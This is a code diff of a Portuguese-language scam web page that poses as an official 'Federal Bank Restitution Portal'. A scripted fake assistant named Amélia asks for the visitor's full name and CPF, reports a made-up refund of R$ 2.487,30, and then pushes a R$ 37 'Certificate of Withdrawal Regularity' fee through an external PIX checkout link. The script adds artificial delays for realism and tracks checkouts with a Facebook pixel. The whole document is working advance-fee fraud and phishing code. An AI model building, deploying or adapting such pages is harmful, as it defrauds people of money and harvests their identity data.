@@ -1,135 +1,78 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Restituição Bancária - Consulta Oficial</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1773918999950681'); 
-    fbq('track', 'PageView');
-    </script>
+<script>
+    const chat = document.getElementById('chat');
+    const typing = document.getElementById('typing-indicator');
+    let userName = "";
+    let currentMsg = 0;
 
-    <style>
-        body { font-family: 'Roboto', sans-serif; background-color: #e9eaed; margin: 0; padding: 0; }
-        .header { background: #0044cc; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 14px; position: fixed; width: 100%; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .chat-container { max-width: 500px; margin: 70px auto 20px auto; background: white; min-height: 90vh; display: flex; flex-direction: column; padding: 15px; position: relative; }
-        
-        .message { margin-bottom: 15px; max-width: 85%; padding: 12px; border-radius: 15px; font-size: 15px; line-height: 1.4; position: relative; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .bot-msg { background: #f0f2f5; align-self: flex-start; color: #1c1e21; border-bottom-left-radius: 2px; }
-        .user-input-box { align-self: center; width: 100%; margin-top: 10px; display: none; }
-        .input-field { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px; font-size: 16px; }
-        .btn-send { background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        
-        .typing { font-size: 12px; color: #65676b; margin-bottom: 10px; display: none; }
-        .avatar-info { display: flex; align-items: center; margin-bottom: 5px; }
-        .avatar-img { width: 30px; height: 30px; border-radius: 50%; margin-right: 8px; }
-        .author-name { font-size: 12px; font-weight: bold; color: #0044cc; }
+    const messages = [
+        { type: 'bot', text: 'Olá! Sou a Amélia, assistente virtual do <b>Consultor Roberto Silva</b>. Bem-vindo ao sistema de auditoria bancária.' },
+        { type: 'bot', text: 'Identificamos um saldo pendente de restituição vinculado a contas ativas nos últimos 15 anos. Para começarmos, <b>qual o seu nome completo?</b>', input: 'text', placeholder: 'Digite seu nome...', btn: 'Continuar' },
+        { type: 'bot', text: 'Prazer, {name}! Agora, informe seu <b>CPF</b> para consultarmos a base da Instituição Financeira e calcular os juros abusivos.', input: 'tel', placeholder: '000.000.000-00', btn: 'Validar CPF' },
+        { type: 'bot', text: 'Estamos realizando a Auditoria de Contas... Isso pode levar alguns segundos ⏳' },
+        { type: 'bot', text: '<b>RESULTADO DA AUDITORIA CONCLUÍDO!</b><br><br>Consultor Roberto Silva liberou o seu extrato de restituição.' },
+        { type: 'bot', html: `<div class="extrato-box"><p style="margin:0; font-size:12px; color:#666;">SALDO TOTAL DISPONÍVEL</p><div class="valor-grande">R$ 2.487,30</div><p style="margin:5px 0 0 0; font-size:11px; color:#28a745;"><b>LIBERAÇÃO VIA PIX IMEDIATA</b></p></div>` },
+        { type: 'bot', text: 'Para que o banco realize o estorno imediato para sua conta, o sistema exige a emissão da <b>Certidão de Regularidade de Saque</b>.' },
+        { type: 'bot', text: 'Esta certidão tem um custo único de <b>R$ 37,00</b>. <br><br>⚠️ <b>IMPORTANTE:</b> Este valor de R$ 37,00 é integralmente <b>REEMBOLSADO</b> para você junto com o seu saque de R$ 2.487,30.' },
+        { type: 'bot', text: 'Ou seja, você paga a taxa agora e recebe <b>R$ 2.524,30</b> no seu PIX em até 10 minutos. Podemos emitir sua certidão?' },
+        { type: 'bot', html: `<a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-checkout" onclick="fbq('track', 'InitiateCheckout');">✅ EMITIR CERTIDÃO E RECEBER PIX</a>` }
+    ];
 
-        .extrato-box { background: #fff; border: 2px dashed #28a745; padding: 15px; text-align: center; margin: 10px 0; border-radius: 10px; }
-        .valor-grande { font-size: 28px; font-weight: 900; color: #28a745; }
-        
-        .btn-checkout { background: #0044cc; color: white; text-decoration: none; padding: 18px; border-radius: 10px; font-weight: 900; display: block; text-align: center; margin-top: 15px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-    </style>
-</head>
-<body>
+    function showMessage() {
+        if (currentMsg >= messages.length) return;
 
-    <div class="header">
-        <i class="fas fa-university"></i> PORTAL DE RESTITUIÇÃO BANCÁRIA FEDERAL
-    </div>
+        typing.style.display = 'block';
+        chat.appendChild(typing);
+        window.scrollTo(0, document.body.scrollHeight);
 
-    <div class="chat-container" id="chat">
-        <div id="typing-indicator" class="typing">Amélia está digitando...</div>
-    </div>
+        setTimeout(() => {
+            typing.style.display = 'none';
+            const msgData = messages[currentMsg];
+            const msgDiv = document.createElement('div');
+            msgDiv.className = 'message bot-msg';
+            
+            let header = `<div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>`;
+            
+            if (msgData.html) {
+                msgDiv.innerHTML = header + msgData.html;
+            } else {
+                let text = msgData.text.replace('{name}', userName);
+                msgDiv.innerHTML = header + text;
+            }
 
-    <script>
-        const chat = document.getElementById('chat');
-        const typing = document.getElementById('typing-indicator');
-        let userName = "";
+            chat.appendChild(msgDiv);
+            window.scrollTo(0, document.body.scrollHeight);
 
-        const messages = [
-            { type: 'bot', text: 'Olá! Sou a Amélia, assistente virtual do <b>Consultor Roberto Silva</b>. Bem-vindo ao sistema de auditoria bancária.' },
-            { type: 'bot', text: 'Identificamos um saldo pendente de restituição vinculado a contas ativas nos últimos 15 anos. Para começarmos, <b>qual o seu nome completo?</b>', input: 'text', placeholder: 'Digite seu nome...', btn: 'Continuar' },
-            { type: 'bot', text: 'Prazer, {name}! Agora, informe seu <b>CPF</b> para consultarmos a base da Instituição Financeira e calcular os juros abusivos.', input: 'text', placeholder: '000.000.000-00', btn: 'Validar CPF' },
-            { type: 'bot', text: 'Estamos realizando a Auditoria de Contas... Isso pode levar alguns segundos ⏳' },
-            { type: 'bot', text: '<b>RESULTADO DA AUDITORIA CONCLUÍDO!</b><br><br>Consultor Roberto Silva liberou o seu extrato de restituição.' },
-            { type: 'bot', html: `<div class="extrato-box">
-                                    <p style="margin:0; font-size:12px; color:#666;">SALDO TOTAL DISPONÍVEL</p>
-                                    <div class="valor-grande">R$ 2.487,30</div>
-                                    <p style="margin:5px 0 0 0; font-size:11px; color:#28a745;"><b>LIBERAÇÃO VIA PIX IMEDIATA</b></p>
-                                 </div>` },
-            { type: 'bot', text: 'Para que o banco realize o estorno imediato para sua conta, o sistema exige a emissão da <b>Certidão de Regularidade de Saque</b>.' },
-            { type: 'bot', text: 'Esta certidão tem um custo único de <b>R$ 37,00</b>. <br><br>⚠️ <b>IMPORTANTE:</b> Este valor de R$ 37,00 é integralmente <b>REEMBOLSADO</b> para você junto com o seu saque de R$ 2.487,30.' },
-            { type: 'bot', text: 'Ou seja, você paga a taxa agora e recebe <b>R$ 2.524,30</b> no seu PIX em até 10 minutos. Podemos emitir sua certidão?' },
-            { type: 'bot', html: `<a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-checkout" onclick="fbq('track', 'InitiateCheckout');">✅ EMITIR CERTIDÃO E RECEBER PIX</a>` }
-        ];
-
-        let currentMsg = 0;
-
-        function showMessage() {
-            if (currentMsg >= messages.length) return;
-
-            typing.style.display = 'block';
-            chat.appendChild(typing);
-
-            setTimeout(() => {
-                typing.style.display = 'none';
-                const msgData = messages[currentMsg];
-                const msgDiv = document.createElement('div');
-                msgDiv.className = 'message bot-msg';
-                
-                // Avatar e Nome
-                let header = `<div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>`;
-                
-                if (msgData.html) {
-                    msgDiv.innerHTML = header + msgData.html;
-                } else {
-                    let text = msgData.text.replace('{name}', userName);
-                    msgDiv.innerHTML = header + text;
-                }
-
-                chat.appendChild(msgDiv);
+            if (msgData.input) {
+                const inputDiv = document.createElement('div');
+                inputDiv.className = 'user-input-box';
+                inputDiv.style.display = 'block';
+                inputDiv.innerHTML = `
+                    <input type="${msgData.input}" id="user-field-${currentMsg}" class="input-field" placeholder="${msgData.placeholder}">
+                    <button class="btn-send" id="btn-action-${currentMsg}">${msgData.btn}</button>
+                `;
+                chat.appendChild(inputDiv);
                 window.scrollTo(0, document.body.scrollHeight);
-
-                if (msgData.input) {
-                    const inputDiv = document.createElement('div');
-                    inputDiv.className = 'user-input-box';
-                    inputDiv.style.display = 'block';
-                    inputDiv.innerHTML = `
-                        <input type="${msgData.input}" id="user-in" class="input-field" placeholder="${msgData.placeholder}">
-                        <button class="btn-send" id="btn-in">${msgData.btn}</button>
-                    `;
-                    chat.appendChild(inputDiv);
-                    
-                    document.getElementById('btn-in').onclick = function() {
-                        const val = document.getElementById('user-in').value;
-                        if (val.length < 3) return alert('Por favor, preencha corretamente.');
-                        if (currentMsg === 1) userName = val.split(' ')[0];
-                        inputDiv.style.display = 'none';
-                        currentMsg++;
-                        showMessage();
-                    };
-                } else {
+                
+                document.getElementById(`btn-action-${currentMsg}`).addEventListener('click', function() {
+                    const val = document.getElementById(`user-field-${currentMsg}`).value;
+                    if (val.length < 3) {
+                        alert('Por favor, preencha os dados corretamente.');
+                        return;
+                    }
+                    if (currentMsg === 1) userName = val.split(' ')[0];
+                    inputDiv.style.display = 'none';
                     currentMsg++;
-                    setTimeout(showMessage, 2500);
-                }
-            }, 1500);
-        }
+                    showMessage();
+                });
+            } else {
+                currentMsg++;
+                // Se for a mensagem de "Auditoria de Contas", espera um pouco mais pra dar realismo
+                let delay = (currentMsg === 4) ? 4000 : 2000;
+                setTimeout(showMessage, delay);
+            }
+        }, 1200);
+    }
 
-        showMessage();
-    </script>
-</body>
-</html>
+    // Inicia o chat assim que a página carrega
+    window.onload = showMessage;
+</script>
